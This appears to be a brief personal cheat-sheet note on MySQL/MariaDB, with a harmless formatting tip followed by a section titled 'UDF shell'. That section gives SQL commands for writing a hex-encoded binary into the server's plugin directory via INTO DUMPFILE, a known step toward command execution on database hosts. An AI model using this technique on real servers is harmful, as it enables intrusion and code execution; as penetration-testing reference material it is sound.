# mysql mariadb

## display query output as pretty printed text with column names
Add `\G`
```
select * from users \G
```

## UDF shell
## write any binary file with file permissions
`set @shell=0x <hex here> ;`
paste in hex as a variable with no quotes.
prepare payload as plain hex with no newlines with ~/kb/bash-scripting/string-to-hex.sh
```SQL
select @@plugin_dir;
select binary @shell into dumpfile '/path/to/file/file.so';
```
